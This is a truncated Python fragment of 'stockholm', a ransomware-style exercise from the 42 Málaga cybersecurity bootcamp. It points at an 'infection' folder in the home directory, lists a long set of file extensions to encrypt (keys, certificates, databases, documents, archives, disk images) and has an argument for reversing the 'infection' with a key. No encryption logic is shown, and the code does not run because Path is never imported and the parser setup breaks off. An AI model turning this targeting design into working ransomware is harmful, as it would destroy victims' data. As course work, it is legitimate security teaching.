import argparse
import os

infect = str(Path.home()) + "/infection"
version = "stockholm 42.0"
extensions = [".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".odt", ".ott", ".sxw", ".stw", ".uot", ".3ds", ".max",
                ".3dm", ".ods", ".ots", ".sxc", ".stc", ".dif", ".slk", ".wb2", ".odp", ".otp", ".sxd", ".std", ".uop", ".odg",
                ".otg", ".sxm", ".mml", ".lay", ".lay6", ".asc", ".sqlite3", ".sqlitedb", ".sql", ".accdb", ".mdb", ".dbf", ".odb",
                ".frm", ".myd", ".myi", ".ibd", ".mdf", ".ldf", ".sln", ".suo", ".cpp", ".pas", ".asm", ".cmd", ".bat", ".ps1",
                ".vbs", ".dip", ".dch", ".sch", ".brd", ".jsp", ".php", ".asp", ".java", ".jar", ".class", ".mp3", ".wav", ".swf",
                ".fla", ".wmv", ".mpg", ".vob", ".mpeg", ".asf", ".avi", ".mov", ".mp4", ".3gp", ".mkv", ".3g2", ".flv", ".wma",
                ".mid", ".m3u", ".m4u", ".djvu", ".svg", ".psd", ".nef", ".tiff", ".tif", ".cgm", ".raw", ".gif", ".png", ".bmp",
                ".jpg", ".jpeg", ".vcd", ".iso", ".backup", ".zip", ".rar", ".tgz", ".tar", ".bak", ".tbk", ".bz2", ".PAQ", ".ARC",
                ".aes", ".gpg", ".vmx", ".vmdk", ".vdi", ".sldm", ".sldx", ".sti", ".sxi", ".602", ".hwp", ".snt", ".onetoc2", ".dwg",
                ".pdf", ".wk1", ".wks", ".123", ".rtf", ".csv", ".txt", ".vsdx", ".vsd", ".edb", ".eml", ".msg", ".ost", ".pst",
                ".potm", ".potx", ".ppam", ".ppsx", ".ppsm", ".pps", ".pot", ".pptm", ".pptx", ".ppt", ".xltm", ".xltx", ".xlc",
                ".xlm", ".xlt", ".xlw", ".xlsb", ".xlsm", ".xlsx", ".xls", ".dotx", ".dotm", ".dot", ".docm", ".docb", ".docx", ".doc"]

def read_arguments():
    analyzer = init_analyzer()
    
    return analyzer.r, analyzer.v, analyzer.s, analyzer.p

def init_analyzer():
    analyzer = argparse.ArgumentParser(
        description="Tool to encrypt and decrypt files.",
        epilog="Exercise 'stockholm' from 42 Málaga Bootcamp."
    )
    
    analyzer.add_argument(
        metavar="key",
        help="Revert the infection using the encrypt key.",
        type=str
    )
    
    